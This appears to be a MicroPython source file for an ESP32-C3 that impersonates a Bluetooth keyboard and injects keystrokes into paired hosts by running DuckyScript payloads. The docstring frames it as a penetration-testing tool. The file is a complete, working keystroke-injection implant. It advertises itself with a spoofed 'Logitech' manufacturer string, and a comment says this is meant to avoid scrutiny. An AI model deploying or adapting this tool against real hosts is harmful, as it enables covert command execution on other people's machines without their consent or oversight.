"""BLE HID keyboard — wireless keystroke injection from the ESP32-C3.

The C3 has no USB OTG. Its USB peripheral is a fixed-function Serial/JTAG
controller that can only do CDC-ACM, so the board physically cannot enumerate
as a USB keyboard. What it does have is BLE 5.0, and HID-over-GATT is the
same capability without the cable: the target sees a Bluetooth keyboard.

That difference matters operationally, and both directions cut:

  * You do not need physical access to a port. You need to be in radio range.
  * The target must pair, or must already trust a keyboard. Hosts that accept
    unauthenticated HID connections are the finding; hosts that demand
    confirmed pairing are not vulnerable to this and the engagement report
    should say so.

Payloads are DuckyScript, the same dialect the rest of the industry uses, so
existing payloads work unmodified.
"""

import struct
import time

import bluetooth
from micropython import const

# -- HID over GATT --------------------------------------------------------

_HID_SERVICE = bluetooth.UUID(0x1812)
_HID_INFO = bluetooth.UUID(0x2A4A)
_REPORT_MAP = bluetooth.UUID(0x2A4B)
_HID_CONTROL = bluetooth.UUID(0x2A4C)
_REPORT = bluetooth.UUID(0x2A4D)
_PROTOCOL_MODE = bluetooth.UUID(0x2A4E)
_REPORT_REF = bluetooth.UUID(0x2908)
_DEVICE_INFO = bluetooth.UUID(0x180A)
_MANUFACTURER = bluetooth.UUID(0x2A29)
_BATTERY_SERVICE = bluetooth.UUID(0x180F)
_BATTERY_LEVEL = bluetooth.UUID(0x2A19)

_FLAG_READ = const(0x0002)
_FLAG_WRITE_NO_RESPONSE = const(0x0004)
_FLAG_WRITE = const(0x0008)
_FLAG_NOTIFY = const(0x0010)

_IRQ_CENTRAL_CONNECT = const(1)
_IRQ_CENTRAL_DISCONNECT = const(2)

# Standard boot-protocol keyboard report descriptor: 8 bits of modifiers, one
# reserved byte, then six key slots. Every host understands this without a
# driver, which is the whole point of using the boot layout.
_REPORT_DESCRIPTOR = bytes([
    0x05, 0x01,        # Usage Page (Generic Desktop)
    0x09, 0x06,        # Usage (Keyboard)
    0xA1, 0x01,        # Collection (Application)
    0x05, 0x07,        #   Usage Page (Keyboard/Keypad)
    0x19, 0xE0,        #   Usage Minimum (Left Control)
    0x29, 0xE7,        #   Usage Maximum (Right GUI)
    0x15, 0x00,        #   Logical Minimum (0)
    0x25, 0x01,        #   Logical Maximum (1)
    0x75, 0x01,        #   Report Size (1)
    0x95, 0x08,        #   Report Count (8)
    0x81, 0x02,        #   Input (Data, Variable, Absolute) - modifier byte
    0x95, 0x01,        #   Report Count (1)
    0x75, 0x08,        #   Report Size (8)
    0x81, 0x01,        #   Input (Constant) - reserved byte
    0x95, 0x05,        #   Report Count (5)
    0x75, 0x01,        #   Report Size (1)
    0x05, 0x08,        #   Usage Page (LEDs)
    0x19, 0x01,        #   Usage Minimum (Num Lock)
    0x29, 0x05,        #   Usage Maximum (Kana)
    0x91, 0x02,        #   Output (Data, Variable, Absolute) - LED report
    0x95, 0x01,        #   Report Count (1)
    0x75, 0x03,        #   Report Size (3)
    0x91, 0x01,        #   Output (Constant) - LED padding
    0x95, 0x06,        #   Report Count (6)
    0x75, 0x08,        #   Report Size (8)
    0x15, 0x00,        #   Logical Minimum (0)
    0x25, 0x65,        #   Logical Maximum (101)
    0x05, 0x07,        #   Usage Page (Keyboard/Keypad)
    0x19, 0x00,        #   Usage Minimum (0)
    0x29, 0x65,        #   Usage Maximum (101)
    0x81, 0x00,        #   Input (Data, Array) - six key slots
    0xC0,              # End Collection
])

# -- HID usage codes (US layout) -----------------------------------------

MOD_CTRL = const(0x01)
MOD_SHIFT = const(0x02)
MOD_ALT = const(0x04)
MOD_GUI = const(0x08)

# Unshifted printable characters.
_KEYS = {}
for _i, _c in enumerate("abcdefghijklmnopqrstuvwxyz"):
    _KEYS[_c] = 0x04 + _i
for _i, _c in enumerate("1234567890"):
    _KEYS[_c] = 0x1E + _i
_KEYS.update({
    "\n": 0x28, "\x1b": 0x29, "\b": 0x2A, "\t": 0x2B, " ": 0x2C,
    "-": 0x2D, "=": 0x2E, "[": 0x2F, "]": 0x30, "\\": 0x31,
    ";": 0x33, "'": 0x34, "`": 0x35, ",": 0x36, ".": 0x37, "/": 0x38,
})

# Characters that need shift, mapped to the unshifted key they share.
_SHIFTED = {
    "!": "1", "@": "2", "#": "3", "$": "4", "%": "5", "^": "6", "&": "7",
    "*": "8", "(": "9", ")": "0", "_": "-", "+": "=", "{": "[", "}": "]",
    "|": "\\", ":": ";", '"': "'", "~": "`", "<": ",", ">": ".", "?": "/",
}
for _c in "ABCDEFGHIJKLMNOPQRSTUVWXYZ":
    _SHIFTED[_c] = _c.lower()

# Named keys usable in DuckyScript.
NAMED = {
    "ENTER": 0x28, "RETURN": 0x28, "ESC": 0x29, "ESCAPE": 0x29,
    "BACKSPACE": 0x2A, "TAB": 0x2B, "SPACE": 0x2C, "CAPSLOCK": 0x39,
    "PRINTSCREEN": 0x46, "SCROLLLOCK": 0x47, "PAUSE": 0x48,
    "INSERT": 0x49, "HOME": 0x4A, "PAGEUP": 0x4B, "DELETE": 0x4C,
    "DEL": 0x4C, "END": 0x4D, "PAGEDOWN": 0x4E,
    "RIGHT": 0x4F, "RIGHTARROW": 0x4F, "LEFT": 0x50, "LEFTARROW": 0x50,
    "DOWN": 0x51, "DOWNARROW": 0x51, "UP": 0x52, "UPARROW": 0x52,
    "MENU": 0x65, "APP": 0x65,
}
for _n in range(1, 13):
    NAMED["F%d" % _n] = 0x39 + _n      # F1 = 0x3A

MODIFIERS = {
    "CTRL": MOD_CTRL, "CONTROL": MOD_CTRL,
    "SHIFT": MOD_SHIFT, "ALT": MOD_ALT,
    "GUI": MOD_GUI, "WINDOWS": MOD_GUI, "COMMAND": MOD_GUI, "META": MOD_GUI,
}


def _advertising_payload(name):
    """Flags, appearance (keyboard), the HID service, and a name."""
    payload = bytearray()

    def field(kind, value):
        payload.extend(struct.pack("BB", len(value) + 1, kind))
        payload.extend(value)

    field(0x01, struct.pack("B", 0x06))              # general discoverable
    field(0x19, struct.pack("<h", 961))              # appearance: keyboard
    field(0x03, struct.pack("<h", 0x1812))           # HID service
    field(0x09, name.encode()[:20])                  # complete local name
    return bytes(payload)


class BLEKeyboard:
    """A Bluetooth keyboard the target can pair with."""

    def __init__(self, name="Wireless Keyboard"):
        self._ble = bluetooth.BLE()
        self._ble.active(True)
        self._ble.irq(self._irq)
        self._conn = None
        self.name = name

        # Device Information makes the advertisement look like a real
        # peripheral; a nameless HID device invites scrutiny.
        services = (
            (_DEVICE_INFO, ((_MANUFACTURER, _FLAG_READ),)),
            (_BATTERY_SERVICE, ((_BATTERY_LEVEL, _FLAG_READ | _FLAG_NOTIFY),)),
            (_HID_SERVICE, (
                (_HID_INFO, _FLAG_READ),
                (_REPORT_MAP, _FLAG_READ),
                (_HID_CONTROL, _FLAG_WRITE_NO_RESPONSE),
                (_PROTOCOL_MODE, _FLAG_READ | _FLAG_WRITE_NO_RESPONSE),
                (_REPORT, _FLAG_READ | _FLAG_NOTIFY),
            )),
        )
        handles = self._ble.gatts_register_services(services)
        (self._h_manufacturer,) = handles[0]
        (self._h_battery,) = handles[1]
        (self._h_info, self._h_map, self._h_control,
         self._h_protocol, self._h_report) = handles[2]

        self._ble.gatts_write(self._h_manufacturer, b"Logitech")
        self._ble.gatts_write(self._h_battery, struct.pack("B", 96))
        # bcdHID 1.11, country 0, RemoteWake | NormallyConnectable
        self._ble.gatts_write(self._h_info, b"\x11\x01\x00\x03")
        self._ble.gatts_write(self._h_map, _REPORT_DESCRIPTOR)
        self._ble.gatts_write(self._h_protocol, b"\x01")   # report protocol
        self._ble.gatts_write(self._h_report, bytes(8))

    def _irq(self, event, data):
        if event == _IRQ_CENTRAL_CONNECT:
            self._conn = data[0]
            print("paired: central connected")
        elif event == _IRQ_CENTRAL_DISCONNECT:
            self._conn = None
            print("central disconnected")
            self.advertise()

    def advertise(self, interval_us=100000):
        self._ble.gap_advertise(interval_us,
                                adv_data=_advertising_payload(self.name))

    @property
    def connected(self):
        return self._conn is not None

    def wait_for_host(self, seconds=120):
        """Advertise until something pairs, or give up."""
        self.advertise()
        deadline = time.time() + seconds
        while not self.connected and time.time() < deadline:
            time.sleep(0.2)
        return self.connected

    # -- sending ----------------------------------------------------------

    def _send(self, modifier=0, keys=()):
        if self._conn is None:
            return False
        report = bytearray(8)
        report[0] = modifier
        for index, code in enumerate(keys[:6]):
            report[2 + index] = code
        self._ble.gatts_notify(self._conn, self._h_report, bytes(report))
        return True

    def tap(self, code, modifier=0, hold_ms=12):
        """Press and release. The release is what makes the host register a
        discrete keystroke rather than an auto-repeat."""
        if not self._send(modifier, (code,)):
            return False
        time.sleep_ms(hold_ms)
        self._send(0, ())
        time.sleep_ms(hold_ms)
        return True

    def combo(self, modifier, codes):
        if not self._send(modifier, codes):
            return False
        time.sleep_ms(20)
        self._send(0, ())
        time.sleep_ms(20)
        return True

    def type(self, text):
        """Type a string. Returns how many characters were sent."""
        sent = 0
        for char in text:
            if char in _SHIFTED:
                code = _KEYS.get(_SHIFTED[char])
                modifier = MOD_SHIFT
            else:
                code = _KEYS.get(char)
                modifier = 0
            if code is None:
                continue        # outside the US layout; skip rather than guess
            if self.tap(code, modifier):
                sent += 1
        return sent


# -- DuckyScript ----------------------------------------------------------

class Ducky:
    """DuckyScript 1.0 interpreter driving a BLE keyboard.

    Supports REM, DELAY, DEFAULT_DELAY/DEFAULTDELAY, STRING, STRINGLN,
    REPEAT, and modifier combinations (GUI r, CTRL ALT DELETE, SHIFT F10).
    REPEAT is capped so a typo cannot lock a target up.
    """

    MAX_REPEAT = 500

    def __init__(self, keyboard):
        self.kbd = keyboard
        self.default_delay = 0
        self.last_line = None
        self.lines_run = 0
        self.keys_sent = 0

    def run_line(self, line):
        stripped = line.strip()
        if not stripped or stripped.upper().startswith(("REM", "#")):
            return
        head, _, rest = stripped.partition(" ")
        head = head.upper()

        if head == "DELAY":
            time.sleep_ms(self._int(rest))
            return
        if head in ("DEFAULTDELAY", "DEFAULT_DELAY"):
            self.default_delay = self._int(rest)
            return
        if head == "REPEAT":
            if self.last_line:
                for _ in range(min(self._int(rest), self.MAX_REPEAT)):
                    self.run_line(self.last_line)
            return
        if head in ("STRING", "STRINGLN"):
            self.keys_sent += self.kbd.type(rest)
            if head == "STRINGLN":
                self.kbd.tap(NAMED["ENTER"])
                self.keys_sent += 1
            self._pause()
            self.last_line = stripped
            self.lines_run += 1
            return

        modifier, codes = 0, []
        for token in stripped.split():
            upper = token.upper()
            if upper in MODIFIERS:
                modifier |= MODIFIERS[upper]
            elif upper in NAMED:
                codes.append(NAMED[upper])
            elif len(token) == 1:
                if token in _SHIFTED:
                    modifier |= MOD_SHIFT
                    codes.append(_KEYS.get(_SHIFTED[token]))
                else:
                    codes.append(_KEYS.get(token.lower()))
        codes = [c for c in codes if c is not None]
        if codes or modifier:
            self.kbd.combo(modifier, codes)
            self.keys_sent += 1
            self._pause()
        self.last_line = stripped
        self.lines_run += 1

    def _pause(self):
        if self.default_delay:
            time.sleep_ms(self.default_delay)

    @staticmethod
    def _int(value):
        try:
            return int(value.strip())
        except (ValueError, AttributeError):
            return 0

    def run_file(self, path):
        with open(path, "r") as handle:
            for line in handle:
                self.run_line(line)
        return {"lines": self.lines_run, "keys": self.keys_sent}
